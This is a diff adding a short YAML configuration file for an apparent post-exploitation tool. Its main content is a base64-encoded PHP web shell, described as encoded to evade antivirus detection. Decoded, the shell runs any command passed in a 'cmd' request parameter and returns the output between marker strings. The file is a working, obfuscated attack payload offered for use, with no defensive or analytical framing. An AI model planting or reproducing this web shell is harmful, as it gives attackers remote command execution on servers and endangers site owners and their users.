@@ -1,0 +1,10 @@
+﻿# PHP web shell payload - base64 encoded to prevent AV detection
+# decoded only at runtime by post_exploit.py
+shell_type: php
+description: "Minimal PHP command execution shell"
+cmd_param: cmd
+method: GET
+output_start: "SHELL_START"
+output_end: "SHELL_END"
+extra_headers: {}
+payload_b64: "PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWyJjbWQiXSkpeyRjbWQ9JF9SRVFVRVNUWyJjbWQiXTskb3V0PWFycmF5KCk7ZXhlYygkY21kLCRvdXQpO2VjaG8gIlNIRUxMX1NUQVJUIjtlY2hvIGltcGxvZGUoIlxuIiwkb3V0KTtlY2hvICJTSEVMTF9FTkQiO30/Pg=="
